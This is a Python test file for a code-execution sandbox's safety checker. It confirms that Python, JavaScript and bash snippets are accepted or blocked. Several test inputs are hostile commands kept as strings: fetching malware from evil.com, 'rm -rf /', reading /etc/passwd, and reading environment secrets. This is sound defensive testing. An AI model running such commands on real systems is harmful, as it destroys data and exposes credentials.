"""
Tests for src.code_runner — AST safety validation, pattern blocking, execution.
"""
import pytest
from src.code_runner import (
    _is_python_safe_ast,
    _is_js_safe,
    _is_bash_safe,
    is_safe_code,
    get_output_for_content,
    _truncate,
)


# ══════════════════════════════════════════════════════════════
#  PYTHON AST SAFETY
# ══════════════════════════════════════════════════════════════

class TestPythonAstSafety:
    """AST-level validation for Python code."""

    # ── Should PASS ──

    def test_safe_print(self):
        safe, _ = _is_python_safe_ast("print('hello world')")
        assert safe

    def test_safe_math(self):
        safe, _ = _is_python_safe_ast("x = 2 ** 10\nprint(x)")
        assert safe

    def test_safe_list_comprehension(self):
        safe, _ = _is_python_safe_ast("[x**2 for x in range(10)]")
        assert safe

    def test_safe_function_definition(self):
        safe, _ = _is_python_safe_ast("def greet(name):\n    return f'Hello, {name}'")
        assert safe

    def test_safe_class_definition(self):
        code = "class Foo:\n    def bar(self):\n        return 42"
        safe, _ = _is_python_safe_ast(code)
        assert safe

    def test_safe_stdlib_import_math(self):
        """math is not in banned modules — should be allowed."""
        safe, _ = _is_python_safe_ast("import math\nprint(math.sqrt(16))")
        assert safe

    def test_safe_stdlib_import_collections(self):
        safe, _ = _is_python_safe_ast("from collections import Counter\nprint(Counter('hello'))")
        assert safe

    def test_safe_dataclass(self):
        code = "from dataclasses import dataclass\n@dataclass\nclass Point:\n    x: int\n    y: int"
        safe, _ = _is_python_safe_ast(code)
        assert safe

    # ── Should BLOCK ──

    def test_block_import_os(self):
        safe, reason = _is_python_safe_ast("import os")
        assert not safe
        assert "os" in reason.lower()

    def test_block_import_subprocess(self):
        safe, _ = _is_python_safe_ast("import subprocess")
        assert not safe

    def test_block_from_os_import(self):
        safe, _ = _is_python_safe_ast("from os import system")
        assert not safe

    def test_block_from_pathlib(self):
        safe, _ = _is_python_safe_ast("from pathlib import Path")
        assert not safe

    def test_block_import_socket(self):
        safe, _ = _is_python_safe_ast("import socket")
        assert not safe

    def test_block_import_sys(self):
        safe, _ = _is_python_safe_ast("import sys")
        assert not safe

    def test_block_eval(self):
        safe, reason = _is_python_safe_ast("eval('1+1')")
        assert not safe
        assert "eval" in reason

    def test_block_exec(self):
        safe, _ = _is_python_safe_ast("exec('print(1)')")
        assert not safe

    def test_block_open(self):
        safe, _ = _is_python_safe_ast("open('/etc/passwd')")
        assert not safe

    def test_block_dunder_import(self):
        safe, _ = _is_python_safe_ast("__import__('os')")
        assert not safe

    def test_block_dunder_subclasses(self):
        safe, _ = _is_python_safe_ast("x.__subclasses__()")
        assert not safe

    def test_block_dunder_globals(self):
        safe, _ = _is_python_safe_ast("x = globals()")
        assert not safe

    def test_block_nested_import_attempt(self):
        """Nested import inside function should still be caught."""
        safe, _ = _is_python_safe_ast("def f():\n    import os\n    os.system('ls')")
        assert not safe

    def test_block_importlib(self):
        safe, _ = _is_python_safe_ast("import importlib\nimportlib.import_module('os')")
        assert not safe

    def test_block_syntax_error(self):
        safe, reason = _is_python_safe_ast("def (invalid syntax")
        assert not safe
        assert "SyntaxError" in reason


# ══════════════════════════════════════════════════════════════
#  JAVASCRIPT PATTERN SAFETY
# ══════════════════════════════════════════════════════════════

class TestJsSafety:
    """Pattern-based validation for JavaScript."""

    def test_safe_console_log(self):
        safe, _ = _is_js_safe("console.log('hello');")
        assert safe

    def test_safe_arrow_function(self):
        safe, _ = _is_js_safe("const add = (a, b) => a + b;\nconsole.log(add(1, 2));")
        assert safe

    def test_block_require(self):
        safe, _ = _is_js_safe("const fs = require('fs');")
        assert not safe

    def test_block_dynamic_import(self):
        safe, _ = _is_js_safe("const m = import('fs');")
        assert not safe

    def test_block_process_env(self):
        safe, _ = _is_js_safe("console.log(process.env.SECRET);")
        assert not safe

    def test_block_child_process(self):
        safe, _ = _is_js_safe("const cp = require('child_process');")
        assert not safe

    def test_block_eval(self):
        safe, _ = _is_js_safe("eval('alert(1)');")
        assert not safe

    def test_block_fs_module(self):
        safe, _ = _is_js_safe("fs.readFileSync('/etc/passwd');")
        assert not safe

    def test_block_deno(self):
        safe, _ = _is_js_safe("Deno.readTextFile('secret.txt');")
        assert not safe


# ══════════════════════════════════════════════════════════════
#  BASH SAFETY
# ══════════════════════════════════════════════════════════════

class TestBashSafety:
    """Allow-list validation for bash commands."""

    def test_safe_echo(self):
        safe, _ = _is_bash_safe("echo 'Hello World'")
        assert safe

    def test_safe_pipeline(self):
        safe, _ = _is_bash_safe("echo 'hello' | tr 'a-z' 'A-Z'")
        assert safe

    def test_safe_seq(self):
        safe, _ = _is_bash_safe("seq 1 10")
        assert safe

    def test_safe_comment_ignored(self):
        safe, _ = _is_bash_safe("# this is a comment\necho 'hi'")
        assert safe

    def test_safe_variable_assignment(self):
        safe, _ = _is_bash_safe("X=hello\necho $X")
        assert safe

    def test_block_curl(self):
        safe, _ = _is_bash_safe("curl http://evil.com")
        assert not safe

    def test_block_rm(self):
        safe, _ = _is_bash_safe("rm -rf /")
        assert not safe

    def test_block_wget(self):
        safe, _ = _is_bash_safe("wget http://evil.com/malware")
        assert not safe

    def test_block_cat(self):
        safe, _ = _is_bash_safe("cat /etc/passwd")
        assert not safe

    def test_block_python_in_bash(self):
        safe, _ = _is_bash_safe("python3 -c 'import os; os.system(\"ls\")'")
        assert not safe


# ══════════════════════════════════════════════════════════════
#  UNIFIED is_safe_code
# ══════════════════════════════════════════════════════════════

class TestIsSafeCode:
    """Unified safety check dispatcher."""

    def test_dispatches_python(self):
        safe, _ = is_safe_code("print(1)", "python")
        assert safe

    def test_dispatches_javascript(self):
        safe, _ = is_safe_code("console.log(1);", "javascript")
        assert safe

    def test_dispatches_bash(self):
        safe, _ = is_safe_code("echo hi", "bash")
        assert safe

    def test_unsupported_language_returns_false(self):
        safe, reason = is_safe_code("SELECT 1;", "sql")
        assert not safe
        assert "Unsupported" in reason


# ══════════════════════════════════════════════════════════════
#  get_output_for_content
# ══════════════════════════════════════════════════════════════

class TestGetOutputForContent:
    """Test the output selection logic."""

    def test_tip_returns_none(self, sample_content):
        assert get_output_for_content(sample_content) is None

    def test_output_demo_prefers_expected(self, sample_content_output_demo):
        result = get_output_for_content(sample_content_output_demo)
        assert result == "*******Python*******"

    def test_quiz_returns_quiz_answer(self, sample_content_quiz):
        result = get_output_for_content(sample_content_quiz)
        assert "1, 2, 3, 4" in result

    def test_before_after_returns_none(self, sample_content_before_after):
        assert get_output_for_content(sample_content_before_after) is None

    def test_output_demo_empty_expected_no_exec(self, sample_content_output_demo):
        """When expected_output is empty, fallback to execution (or None)."""
        sample_content_output_demo["expected_output"] = ""
        # On Windows test env, python3 may not be available → graceful None
        result = get_output_for_content(sample_content_output_demo)
        # Either got real output or None — both are acceptable
        assert result is None or isinstance(result, str)


# ══════════════════════════════════════════════════════════════
#  _truncate
# ══════════════════════════════════════════════════════════════

class TestTruncate:
    """Output truncation utility."""

    def test_short_string_unchanged(self):
        assert _truncate("hello") == "hello"

    def test_long_string_truncated(self):
        result = _truncate("x" * 600)
        assert len(result) == 500
        assert result.endswith("...")

    def test_strips_whitespace(self):
        assert _truncate("  hello  ") == "hello"

    def test_empty_string(self):
        assert _truncate("") == ""
